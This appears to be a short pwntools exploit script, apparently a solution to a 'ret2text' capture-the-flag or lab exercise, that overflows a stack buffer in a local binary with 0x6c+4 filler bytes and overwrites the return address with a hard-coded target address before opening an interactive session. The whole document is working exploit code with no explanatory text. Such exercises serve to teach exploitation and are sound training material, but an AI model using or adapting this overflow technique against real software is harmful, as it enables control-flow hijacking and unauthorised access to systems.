##!/usr/bin/env python
from pwn import *

sh = process('./ret2text')
esp_addr = 0xffffcfa0
ebp_addr = 0xffffd028
target_addr = 0x0804863A

payload = 'A'*(0x6c+4) + p32(target_addr)
sh.sendline(payload)
sh.interactive()
